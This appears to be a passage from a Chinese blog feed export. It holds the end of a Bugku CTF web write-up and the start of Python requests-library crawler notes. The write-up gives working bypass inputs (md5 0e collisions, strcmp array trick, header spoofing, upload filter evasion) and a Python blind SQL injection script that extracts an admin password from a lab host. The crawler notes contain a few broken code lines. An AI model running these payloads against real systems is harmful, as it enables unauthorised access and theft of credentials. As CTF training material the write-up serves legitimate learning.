<span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )</span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>正则的意思</p><p><code>key</code>+<code>任意单个字符0次或多次</code>+<code>key</code>+<code>任意单个字符4~7次</code>+<code>key</code>+<code>:</code>+<code>/</code>+<code>任意单个字符</code>+<code>/</code>+<code>任意单个字符0次或多次</code>+<code>key</code>+<code>[a-z]</code>+<code>任意标点符号</code></p><p>随便构造一个<code>keykey1111key:/1/keya#</code></p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><p><code>code.txt</code>泄露源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5 弱比较 0e 绕过 + strcmp 函数数组绕过</p><p><code>v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1</code></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><p><code>SQL约束攻击</code>早有耳闻</p><p>[<a href="https://www.freebuf.com/articles/web/124537.html]">https://www.freebuf.com/articles/web/124537.html]</a></p><p>[<a href="https://www.runoob.com/sql/sql-constraints.html]">https://www.runoob.com/sql/sql-constraints.html]</a></p><p>注册账号时，<code>admin+20个空格</code>账号权限等同于<code>admin</code></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p><code>referer:https://www.google.com</code></p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><p>md5 的 0e 弱比较碰撞，传参就行</p><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p><code>x-forwarded-for:127.0.0.1</code></p><h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>sha1数组绕过</p><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><p><code>php://input</code></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><p>dirmap扫出来<code>robots.txt</code>，<code>robots.txt</code>告诉我有个<code>resusl.php</code>，<code>resusl.php</code>告诉我<code>if ($_GET[x]==$password)</code>，题目告诉我我得是管理员，所以<code>$x=admin</code>即可</p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>经典文件上传绕过姿势<code>multipart/form-data</code>、<code> content-type</code>和<code>php5</code></p><p><code>multipart/form-data</code>：  需要在表单中进行文件上传时，需要使用该格式，通过表单对文件格式再进行一次判断，是在后端进行判断，只支持小写字符，通过对请求头中的Content-Type进行大小写绕过，将multipart&#x2F;form-data随便大写一个字母就可以了</p><p><code>content-type</code>：标明上传的文件类型</p><p><code>php5</code>：php的解析漏洞</p><p><strong>form表单的enctype属性：规定了form表单数据在发送到服务器时候的编码方式</strong></p><pre><code>application/x-www-form-urlencoded：默认编码方式multipart/form-data：指定传输数据为二进制数据，例如图片、mp3、文件text/plain：纯文本的传输。空格转换为“+”，但不支持特殊字符编码。</code></pre><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><p>解释 payload：</p><p><strong><code>admin&#39;^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#</code></strong></p><ol><li><p>为了绕过空格过滤，用括号隔开，过滤了等号，用不等号 &lt;&gt;代替，只要是布尔值就可以。</p></li><li><p>mid()函数和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？</p><p>因此，这里用到了ascii()取ascii码值的函数，如果传入一个字符串那么就会取第一个字符的字符的ascii码值，这就有了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，我们将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取。</p></li><li><p>每个字符的ascii码判断，是否不等于给定的数字，会得到一个布尔值(0或1)再与结尾的0进行运算。</p><p>如果数据库名的第一位的ascii码值不是97，where条件是username&#x3D;’admin’^1^0</p><p>返回值是username does not exist!</p><p>如果数据库名的第一位的ascii码值是97，where条件是username&#x3D;’admin’^0^0</p><p>返回值会是password error!</p><p>这就构成了布尔报错注入。</p></li><li><p>最后^0的妙用！ 因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。 因为这里即使是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也无法知道。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str_all=<span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:18157/&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database</span>():</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_all:</span><br><span class="line">            payload=<span class="string">&quot;admin&#x27;^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                result+=j</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>():</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_all:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="built_in">ord</span>(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                result+=j</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;**************************&#x27;</span>,result)</span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#database()</span></span><br><span class="line">password()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku&amp;Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫慕课学习笔记</title>
      <link href="/posts/13919/"/>
      <url>/posts/13919/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>不知道写啥其实说实话</p></blockquote><h1 id="网络爬虫之规则"><a href="#网络爬虫之规则" class="headerlink" title="网络爬虫之规则"></a>网络爬虫之规则</h1><h2 id="安装requests库"><a href="#安装requests库" class="headerlink" title="安装requests库"></a>安装requests库</h2><p>cmd 命令行打开</p><p>输入<code>pip3 install requests</code>，等待即可</p><p>简单测试，爬一下<code>bkjw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;http://172.16.13.22/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line">r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">if</span> (location.href.toLowerCase().lastIndexOf(<span class="string">&#x27;maindesktop&#x27;</span>, <span class="number">0</span>) &gt; <span class="number">0</span>)</span><br><span class="line">        top.location.href = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">&lt;/script&gt;    </span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/extjs/resources/css/ext-all-gray.css&quot;</span> /&gt;</span><br><span class="line">    &lt;!--引入自定义CSS--&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;/Content/css/iconCss.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;/extjs/Desktop/css/desktop.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/Content/style.css&quot;</span> /&gt;</span><br><span class="line">    &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;/extjs/ext-all.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;/extjs/locale/ext-lang-zh_CN.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;/extjs/Extensions/CustomValidate.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;/extjs/Extensions/Util.js?v=0.1&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;/extjs/Desktop/login.js?v=0.1&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="requests库7个主要方法"><a href="#requests库7个主要方法" class="headerlink" title="requests库7个主要方法"></a>requests库7个主要方法</h2><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.request()</td><td align="center">构造一个请求，支撑以下各方法的基础方法</td></tr><tr><td align="center">requests.post()</td><td align="center">向网页提交post请求</td></tr><tr><td align="center">requests.head()</td><td align="center">获取网页头信息</td></tr><tr><td align="center">requests.put()</td><td align="center">向网页提交put请求</td></tr><tr><td align="center">requests.patch()</td><td align="center">向网页提交局部修改请求</td></tr><tr><td align="center">requests.delete()</td><td align="center">向网页提交删除请求</td></tr><tr><td align="center">requests.get()</td><td align="center">向网页提交get请求</td></tr></tbody></table><blockquote><p>requests库其实只有一个方法——<code>request()</code>方法，其他六种方法都是对<code>request()</code>方法的封装</p></blockquote><h2 id="requests库异常处理"><a href="#requests库异常处理" class="headerlink" title="requests库异常处理"></a>requests库异常处理</h2><table><thead><tr><th align="center">异常</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.ConnectionError</td><td align="center">网络连接错误异常，如DNS查询失败、拒绝连接</td></tr><tr><td align="center">requests.HTTPError</td><td align="center">HTTP错误异常</td></tr><tr><td align="center">requests.URLRequired</td><td align="center">URL缺失</td></tr><tr><td align="center">requests.TooManyRedirects</td><td align="center">超过最大重定向次数，产生重定向异常</td></tr><tr><td align="center">requests.ConnectTimeout</td><td align="center">连接远程服务器超时异常</td></tr><tr><td align="center">requests.Timeout</td><td align="center">请求URL超时，产生超时异常</td></tr></tbody></table><h2 id="response对象的常用属性和方法"><a href="#response对象的常用属性和方法" class="headerlink" title="response对象的常用属性和方法"></a>response对象的常用属性和方法</h2><blockquote><p>**dir()**一个response对象可以看到它的属性和方法</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;__attrs__&#x27;</span>, <span class="string">&#x27;__bool__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__enter__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__exit__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getstate__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__nonzero__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__setstate__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;_content&#x27;</span>, <span class="string">&#x27;_content_consumed&#x27;</span>, <span class="string">&#x27;_next&#x27;</span>, <span class="string">&#x27;apparent_encoding&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>, <span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;elapsed&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;history&#x27;</span>, <span class="string">&#x27;is_permanent_redirect&#x27;</span>, <span class="string">&#x27;is_redirect&#x27;</span>, <span class="string">&#x27;iter_content&#x27;</span>, <span class="string">&#x27;iter_lines&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;links&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;ok&#x27;</span>, <span class="string">&#x27;raise_for_status&#x27;</span>, <span class="string">&#x27;raw&#x27;</span>, <span class="string">&#x27;reason&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;status_code&#x27;</span>, <span class="string">&#x27;text&#x27;</span>, <span class="string">&#x27;url&#x27;</span>]</span><br></pre></td></tr></table></figure><p>常用的属性</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">r.headers</td><td align="center">HTTP响应头</td></tr><tr><td align="center">r.status_code</td><td align="center">HTTP请求的返回状态，200表示连接成功，404表示失败</td></tr><tr><td align="center">r.text</td><td align="center">HTTP响应内容的字符串形式，即url对应的页面内容</td></tr><tr><td align="center">r.encoding</td><td align="center">从HTTP header中猜测的响应内容编码方式</td></tr><tr><td align="center">r.apparent_encoding</td><td align="center">从内容中分析出的响应内容编码方式（备选编码方式）</td></tr><tr><td align="center">r.content</td><td align="center">HTTP响应内容的二进制形式</td></tr><tr><td align="center">r.ok</td><td align="center">HTTP请求成功没，返回True或False</td></tr></tbody></table><blockquote><p><code>r.encoding</code>：如果 header 中不存在 <code>charset</code>，则认为编码为<code>ISO-8859-1</code>，不太准确</p><p><code>r.apparent_encoding</code>：备选编码，从网页的内容分析编码方式，一般准确</p><blockquote><p>常用 <code>r.encodint = r.apparent_encoding</code></p></blockquote></blockquote><h2 id="通用代码框架"><a href="#通用代码框架" class="headerlink" title="通用代码框架"></a>通用代码框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Time : 2020/12/10</span></span><br><span class="line"><span class="string">@Author : C1everF0x</span></span><br><span class="line"><span class="string">@File : demo.py</span></span><br><span class="line"><span class="string">@Description : </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getHTMLText</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()    <span class="comment">#判断异常</span></span><br><span class="line">        </span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;产生异常&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;https://search.bilibili.com/all?keyword=%E5%AE%AB%E6%9C%AC%E7%8B%97%E9%9B%A8&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(getHTMLText(url))</span><br></pre></td></tr></table></figure><h2 id="Requests库方法详解"><a href="#Requests库方法详解" class="headerlink" title="Requests库方法详解"></a>Requests库方法详解</h2><h3 id="重中之重：requests-request"><a href="#重中之重：requests-request" class="headerlink" title="重中之重：requests.request()"></a>重中之重：<code>requests.request()</code></h3><p>原型：<code>requests.request(method,url,**kwargs)</code></p><ul><li><code>method</code>：对应http协议中的七种请求方法</li><li><code>url</code>：请求的链接</li><li><code>**kwargs</code>：控制访问的参数，共13个</li></ul><h3 id="requests-get"><a href="#requests-get" class="headerlink" title="requests.get()"></a><code>requests.get()</code></h3><p>原型：<code>requests.get(url,params=None,**kwargs)</code></p><ul><li><code>url</code>：请求的链接</li><li><code>params</code>：url中的额外参数，字典或字节流格式，可选</li><li><code>**kwargs</code>：控制访问的参数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 传参方法一，直接在url里面拼接</span></span><br><span class="line">url = ”https://search.bilibili.com/<span class="built_in">all</span>?keyword=宫本狗雨“</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(r.url)</span><br><span class="line"><span class="comment"># 传参方法二，将参数保存为字典，传给 params</span></span><br><span class="line">url = <span class="string">&quot;https://search.bilibili.com&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;all?keyword&quot;</span>:<span class="string">&quot;宫本狗雨&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url.params=params)</span><br><span class="line"><span class="built_in">print</span>(r.url)</span><br></pre></td></tr></table></figure><h3 id="requests-post"><a href="#requests-post" class="headerlink" title="requests.post()"></a><code>requests.post()</code></h3><p>原型：<code>requests.post(url,data=None,json=None,**kwargs)</code></p><ul><li><code>url</code>：请求的链接</li><li><code>data</code>：请求的内容，可以是字典，字节序列或文件</li><li><code>json</code>：JSON 格式数据，也是请求的内容</li><li><code>**kwargs</code>：控制访问的参数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 传参方法一：直接post字典</span></span><br><span class="line">url = “https://www.baidu.com”</span><br><span class="line">payload = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;valus&quot;</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">&#x27;url&#x27;</span>,data = payload)</span><br><span class="line">printf(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传参方法二：data = 字符串</span></span><br><span class="line">url = “https://www.baidu.com”</span><br><span class="line">r = requests.post(<span class="string">&#x27;url&#x27;</span>,data = ‘ABCDEFG’)</span><br><span class="line">printf(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>data 等于一个字典的时候，用户传输的数据会被编码到 form 表单当中</p><p>而 data 直接等于一个字符串的时候，用户传输的数据会被编码到 data 里面</p></blockquote><h2 id="13个访问控制参数"><a href="#13个访问控制参数" class="headerlink" title="13个访问控制参数"></a>13个访问控制参数</h2><h3 id="kwargs：控制访问的参数"><a href="#kwargs：控制访问的参数" class="headerlink" title="**kwargs：控制访问的参数"></a><code>**kwargs</code>：控制访问的参数</h3><ul><li><code>params</code>：字典或者字节序列，作为参数增加到 <code>url</code> 中</li><li><code>data</code>：字典、字节序列或文件对象，作为 <code>request</code> 的内容</li><li><code>json</code>： JSON 格式的数据，作为 <code>request </code>的内容</li><li><code>headers</code>：字典，HTTP定制头</li><li><code>cookies</code>：字典或者 <code>cookiejar</code>，作为 <code>request</code>中的 cookie</li><li><code>auth</code>：元组，支持HTTP认证功能</li><li><code>files</code>：字典类型，传输文件</li><li><code>timeout</code>：设定超时时间，秒为单位，超时返回异常</li><li><code>proxies</code>：字典类型，设定访问代理服务器的 ip 地址，可以增加登陆认证</li><li><code>allow_redirects</code>：True&#x2F;False，默认为True，重定向开关</li><li><code>stream</code>：True&#x2F;False，默认为True，获取内容立即下载开关</li><li><code>verify</code>：True&#x2F;False，默认为True，认证 SSL 证书开关</li><li><code>cert</code>：本地 SSL 证书路径</li></ul><h2 